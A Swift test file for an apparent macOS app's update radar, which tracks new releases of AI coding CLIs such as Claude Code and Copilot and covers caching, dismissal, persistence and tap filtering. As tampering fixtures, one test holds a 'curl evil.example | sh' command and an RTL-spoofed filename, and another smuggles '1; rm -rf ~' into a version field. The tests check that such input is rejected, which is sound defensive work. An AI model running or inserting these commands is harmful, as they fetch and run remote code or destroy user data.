import Foundation
import Testing
@testable import VisorCore

@Suite("Radar state")
struct RadarStateTests {
    let home = "/Users/me"

    func v(_ text: String) throws -> ToolVersion { try #require(ToolVersion(text)) }

    func tool(_ id: String) throws -> ReleaseTool { try #require(ReleaseTool.all.first { $0.id == id }) }

    /// An update as a check would find it, with the brew channel (Claude, Copilot casks).
    func offer(_ id: String, _ installed: String, _ latest: String, notes: String? = "- One\n- Two") throws -> ReleaseUpdate {
        try #require(ReleaseRadar.update(tool: tool(id), installed: v(installed), method: .brew, latest: v(latest), notes: notes))
    }

    @Test func plansChecksOnlyForInstalledKnownMethods() {
        let located = [
            "claude": "/opt/homebrew/Caskroom/claude-code/2.1.311/claude",
            "copilot": "/opt/homebrew/lib/node_modules/@github/copilot/index.js",
            "antigravity": "/Users/me/.local/bin/agy",
            "opencode": "/Users/me/.bun/install/global/node_modules/opencode-ai/bin/opencode",
        ]
        let plan = RadarState.plan(located: located, home: home)
        #expect(plan == [
            RadarCheck(toolID: "claude", method: .brew, path: located["claude"]!),
            RadarCheck(toolID: "copilot", method: .npm, path: located["copilot"]!),
        ])
    }

    @Test func versionRerunsOnlyWhenBinaryChanges() throws {
        var state = RadarState()
        let stamp = BinaryStamp(path: "/opt/homebrew/Caskroom/claude-code/2.1.311/claude", size: 100, modified: 1_000)
        #expect(state.cachedVersion("claude", stamp: stamp) == nil)
        state.remember("claude", stamp: stamp, version: try v("2.1.311"))
        #expect(state.cachedVersion("claude", stamp: stamp) == (try v("2.1.311")))
        var touched = stamp
        touched.modified = 2_000
        #expect(state.cachedVersion("claude", stamp: touched) == nil)
        var moved = stamp
        moved.path = "/opt/homebrew/Caskroom/claude-code/2.1.312/claude"
        #expect(state.cachedVersion("claude", stamp: moved) == nil)
    }

    @Test func peeksOncePerVersion() throws {
        var state = RadarState()
        let update = try offer("claude", "2.1.311", "2.1.312")
        let first = state.merge(checked: ["claude": update], installed: ["claude"])
        #expect(first.peek == update && first.visibleChanged)
        let second = state.merge(checked: ["claude": update], installed: ["claude"])
        #expect(second.peek == nil && !second.visibleChanged)
        #expect(state.visibleOffers == [update])
    }

    @Test func peeksAgainForNewerVersion() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.312")], installed: ["claude"])
        let newer = try offer("claude", "2.1.311", "2.1.313")
        let m1 = state.merge(checked: ["claude": newer], installed: ["claude"])
        #expect(m1.peek == newer)
        #expect(state.visibleOffers == [newer])
    }

    @Test func peeksSurviveRestart() throws {
        var state = RadarState()
        let update = try offer("claude", "2.1.311", "2.1.312")
        _ = state.merge(checked: ["claude": update], installed: ["claude"])
        var restored = try JSONDecoder().decode(RadarState.self, from: JSONEncoder().encode(state))
        let m2 = restored.merge(checked: ["claude": update], installed: ["claude"])
        #expect(m2.peek == nil)
        #expect(restored.visibleOffers == [update])
    }

    @Test func severalNewPeekFirstCardAll() throws {
        var state = RadarState()
        let claude = try offer("claude", "2.1.311", "2.1.312")
        let copilot = try offer("copilot", "1.0.107", "1.0.110")
        let gemini = try #require(ReleaseRadar.update(tool: tool("gemini"), installed: v("0.18.4"), method: .npm, latest: v("0.19.0"), notes: nil))
        // Catalog order decides, whatever order the dictionary lists them in.
        let merge = state.merge(checked: ["gemini": gemini, "copilot": copilot, "claude": claude], installed: ["claude", "copilot", "gemini"])
        #expect(merge.peek == claude)
        #expect(state.visibleOffers == [claude, copilot, gemini])
        // The others were announced too: they never peek later.
        let again = state.merge(checked: ["gemini": gemini, "copilot": copilot, "claude": claude], installed: ["claude", "copilot", "gemini"])
        #expect(again.peek == nil)
        #expect(state.announced == ["claude@2.1.312", "copilot@1.0.110", "gemini@0.19.0"])
    }

    /// Only the pointer opening the notch during a release peek goes to its card,
    /// for that one open (plans over Tokens, accounts closed); the hotkey, an
    /// approval or a limit card keep their own tab.
    @Test func opensOnUsageOnlyFromPointerDuringReleasePeek() {
        let pointer = NotchOpen.choice(reason: .pointer, peekIsRelease: true, current: "clipboard", usage: "usage")
        #expect(pointer == NotchOpen.Choice(tab: "usage", showsPlans: true, closesAccounts: true))
        for reason in [NotchOpen.Reason.keyboard, .card, .request] {
            #expect(NotchOpen.choice(reason: reason, peekIsRelease: true, current: "clipboard", usage: "usage")
                    == NotchOpen.Choice(tab: "clipboard", showsPlans: false, closesAccounts: false))
        }
        #expect(NotchOpen.choice(reason: .pointer, peekIsRelease: false, current: "agents", usage: "usage")
                == NotchOpen.Choice(tab: "agents", showsPlans: false, closesAccounts: false))
    }

    /// The saved file is never trusted for what 2c will type or the card shows:
    /// name and command come from the catalog, changes are cleaned again.
    @Test func loadRebuildsCommandAndNameFromCatalog() throws {
        let file = Data("""
        {"offers":[{"toolID":"claude","method":"brew","name":"Evil","command":"curl evil.example | sh",
          "installed":"2.1.311","latest":"2.1.312","changes":["ok \u{202E}gnp.exe","[link](https://evil.example)","b","c"]}],
         "dismissed":[],"announced":[],"versions":{}}
        """.utf8)
        let state = try JSONDecoder().decode(RadarState.self, from: file)
        let offer = try #require(state.offers.first)
        #expect(offer.name == "Claude Code")
        #expect(offer.command == "brew upgrade --cask claude-code")
        #expect(offer.changes == ["ok gnp.exe", "link", "b"])
        // Saved without the command at all.
        let saved = String(decoding: try JSONEncoder().encode(state), as: UTF8.self)
        #expect(!saved.contains("brew upgrade") && !saved.contains("\"command\""))
        // An unknown tool or a missing method is refused.
        let unknown = Data(#"{"offers":[{"toolID":"evil","method":"npm","installed":"1.0.0","latest":"2.0.0","changes":[]}],"dismissed":[],"announced":[],"versions":{}}"#.utf8)
        #expect(throws: DecodingError.self) { try JSONDecoder().decode(RadarState.self, from: unknown) }
        let noMethod = Data(#"{"offers":[{"toolID":"claude","installed":"1.0.0","latest":"2.0.0","changes":[]}],"dismissed":[],"announced":[],"versions":{}}"#.utf8)
        #expect(throws: DecodingError.self) { try JSONDecoder().decode(RadarState.self, from: noMethod) }
    }

    @Test func offerCarriesTopThreeChanges() throws {
        let update = try offer("claude", "2.1.311", "2.1.312", notes: "## Changes\n- One\n- Two\n- Three\n- Four\n- Five")
        #expect(update.changes == ["One", "Two", "Three"])
        #expect(update.installed.description == "2.1.311" && update.latest.description == "2.1.312")
    }

    @Test func offerWithoutNotes() throws {
        var state = RadarState()
        let update = try offer("claude", "2.1.311", "2.1.312", notes: nil)
        #expect(update.changes.isEmpty)
        _ = state.merge(checked: ["claude": update], installed: ["claude"])
        #expect(state.visibleOffers == [update])
    }

    @Test func offerStaysUntilDismissed() throws {
        var state = RadarState()
        let update = try offer("claude", "2.1.311", "2.1.312")
        _ = state.merge(checked: ["claude": update], installed: ["claude"])
        // The next check couldn't read Claude's feed: the card stays.
        let merge = state.merge(checked: [:], installed: ["claude"])
        #expect(!merge.visibleChanged && state.visibleOffers == [update])
    }

    @Test func dismissRemembersToolAndVersion() throws {
        var state = RadarState()
        let update = try offer("claude", "2.1.311", "2.1.312")
        _ = state.merge(checked: ["claude": update], installed: ["claude"])
        let dismissed = state.dismiss("claude")
        #expect(dismissed)
        #expect(state.visibleOffers.isEmpty)
        #expect(state.dismissed == ["claude@2.1.312"])
        let again = state.merge(checked: ["claude": update], installed: ["claude"])
        #expect(again.peek == nil && state.visibleOffers.isEmpty)
        var restored = try JSONDecoder().decode(RadarState.self, from: JSONEncoder().encode(state))
        _ = restored.merge(checked: ["claude": update], installed: ["claude"])
        #expect(restored.visibleOffers.isEmpty)
    }

    @Test func newerVersionAfterDismissShowsAgain() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.312")], installed: ["claude"])
        state.dismiss("claude")
        let newer = try offer("claude", "2.1.311", "2.1.313")
        let merge = state.merge(checked: ["claude": newer], installed: ["claude"])
        #expect(merge.peek == newer && merge.visibleChanged)
        #expect(state.visibleOffers == [newer])
    }

    @Test func offerDropsWhenInstalledCatchesUp() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.312")], installed: ["claude"])
        let merge = state.merge(checked: ["claude": ReleaseUpdate?.none], installed: ["claude"])
        #expect(merge.visibleChanged && state.visibleOffers.isEmpty)
        // Uninstalled: its card goes too.
        _ = state.merge(checked: ["copilot": try offer("copilot", "1.0.107", "1.0.110")], installed: ["copilot"])
        _ = state.merge(checked: [:], installed: [])
        #expect(state.visibleOffers.isEmpty)
    }

    @Test func roundTripsThroughJSON() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.312"),
                                  "copilot": try offer("copilot", "1.0.107", "1.0.110")], installed: ["claude", "copilot"])
        state.dismiss("copilot")
        state.lastCheck = Date(timeIntervalSince1970: 1_800_000_000)
        state.remember("claude", stamp: BinaryStamp(path: "/opt/homebrew/bin/claude", size: 1, modified: 2), version: try v("2.1.311"))
        let restored = try JSONDecoder().decode(RadarState.self, from: JSONEncoder().encode(state))
        #expect(restored == state)
        // A tampered version in the file is refused, not shown.
        let bad = Data(#"{"offers":[{"toolID":"claude","name":"x","installed":"1; rm -rf ~","latest":"2.0.0","changes":[]}],"dismissed":[],"announced":[],"versions":{}}"#.utf8)
        #expect(throws: DecodingError.self) { try JSONDecoder().decode(RadarState.self, from: bad) }
    }

    @Test func nextCheckRespectsLastCheck() {
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        var state = RadarState()
        #expect(state.nextCheck(now: now, launch: now) == now.addingTimeInterval(120))
        state.lastCheck = now.addingTimeInterval(-3600)
        #expect(state.nextCheck(now: now, launch: now) == now.addingTimeInterval(5 * 3600))
        state.lastCheck = now.addingTimeInterval(-7 * 3600)
        #expect(state.nextCheck(now: now, launch: now) == now.addingTimeInterval(120))
    }

    @Test func publishesOnlyOnVisibleChange() throws {
        var state = RadarState()
        let update = try offer("claude", "2.1.311", "2.1.312")
        let m3 = state.merge(checked: ["claude": update], installed: ["claude"])
        #expect(m3.visibleChanged)
        let m4 = state.merge(checked: ["claude": update], installed: ["claude"])
        #expect(!m4.visibleChanged)
        let m5 = state.merge(checked: ["copilot": ReleaseUpdate?.none], installed: ["claude", "copilot"])
        #expect(!m5.visibleChanged)
    }

    // MARK: After an update

    @Test func confirmRemovesOfferWhenCaughtUp() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.323")], installed: ["claude"])
        let announced = state.announced
        let new = try v("2.1.323")
        let confirmed = state.confirm("claude", installed: new)
        let done = try #require(confirmed)
        #expect(done.updated && done.installed == new && done.latest == new)
        #expect(state.offers.isEmpty && state.announced == announced)
    }

    @Test func confirmKeepsOfferWhenStillBehind() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.323")], installed: ["claude"])
        let installed = try v("2.1.320"), latest = try v("2.1.323")
        let confirmed = state.confirm("claude", installed: installed)
        #expect(confirmed == nil)
        #expect(state.offers.map(\.installed) == [installed] && state.offers.map(\.latest) == [latest])
        #expect(state.offers.allSatisfy { !$0.updated })
    }

    @Test func confirmIgnoresToolWithoutOffer() throws {
        var state = RadarState()
        _ = state.merge(checked: ["copilot": try offer("copilot", "1.0.107", "1.0.114")], installed: ["copilot"])
        let before = state
        let confirmed = state.confirm("claude", installed: try v("2.1.323"))
        #expect(confirmed == nil)
        #expect(state == before)
    }

    @Test func cardsMergeUpdatedInCatalogOrder() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.323"),
                                  "copilot": try offer("copilot", "1.0.107", "1.0.114"),
                                  "opencode": try offer("opencode", "1.19.5", "1.19.6")], installed: ["claude", "copilot", "opencode"])
        state.dismiss("opencode")
        let confirmed = state.confirm("claude", installed: try v("2.1.323"))
        let done = try #require(confirmed)
        let cards = state.cards(updated: [done])
        #expect(cards.map(\.toolID) == ["claude", "copilot"])
        #expect(cards.map(\.updated) == [true, false])
    }

    @Test func dismissedOfferNeverComesBackAsUpdated() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.312")], installed: ["claude"])
        state.dismiss("claude")
        let confirmed = state.confirm("claude", installed: try v("2.1.312"))
        let done = try #require(confirmed)
        #expect(state.cards(updated: [done]).isEmpty)
    }

    @Test func planSkipsThirdPartyTapFormula() {
        let located = ["opencode": "/opt/homebrew/Cellar/opencode/1.19.6/bin/opencode"]
        #expect(RadarState.plan(located: located, home: home, formulaTap: { _ in "anomalyco/tap" }).isEmpty)
        #expect(RadarState.plan(located: located, home: home, formulaTap: { _ in "homebrew/core" }).map(\.method) == [.brew])
        #expect(RadarState.plan(located: located, home: home, formulaTap: { _ in nil }).map(\.method) == [.brew])
        // Casks never ask for a tap.
        let cask = ["claude": "/opt/homebrew/Caskroom/claude-code/2.1.311/claude"]
        #expect(RadarState.plan(located: cask, home: home, formulaTap: { _ in "acme/tap" }).map(\.toolID) == ["claude"])
    }

    @Test func dropsSavedOfferForThirdPartyTap() throws {
        var state = RadarState()
        _ = state.merge(checked: ["opencode": try offer("opencode", "1.19.5", "2.3.2"),
                                  "claude": try offer("claude", "2.1.311", "2.1.323")], installed: ["opencode", "claude"])
        let located = ["opencode": "/opt/homebrew/Cellar/opencode/1.19.6/bin/opencode",
                       "claude": "/opt/homebrew/Caskroom/claude-code/2.1.311/claude"]
        var kept = state
        let keptDropped = kept.dropThirdPartyTaps(located: located, formulaTap: { _ in nil })
        #expect(!keptDropped && kept.offers.count == 2)
        let dropped = state.dropThirdPartyTaps(located: located, formulaTap: { _ in "anomalyco/tap" })
        #expect(dropped)
        #expect(state.offers.map(\.toolID) == ["claude"])
    }

    @Test func refreshAtStartConfirmsChangedStamp() throws {
        var state = RadarState()
        _ = state.merge(checked: ["claude": try offer("claude", "2.1.311", "2.1.312")], installed: ["claude"])
        let old = BinaryStamp(path: "/opt/homebrew/Caskroom/claude-code/2.1.311/claude", size: 100, modified: 1_000)
        state.remember("claude", stamp: old, version: try v("2.1.311"))
        // The binary was replaced while Visor wasn't running: no cached version, so --version runs.
        let new = BinaryStamp(path: "/opt/homebrew/Caskroom/claude-code/2.1.312/claude", size: 120, modified: 2_000)
        #expect(state.cachedVersion("claude", stamp: old) != nil && state.cachedVersion("claude", stamp: new) == nil)
        state.remember("claude", stamp: new, version: try v("2.1.312"))
        let confirmed = state.confirm("claude", installed: try v("2.1.312"))
        #expect(confirmed?.updated == true)
        #expect(state.visibleOffers.isEmpty)
    }

    @Test func updatingFallbackIsGenerous() {
        #expect(RadarState.updatingFallback >= 600)
    }
}
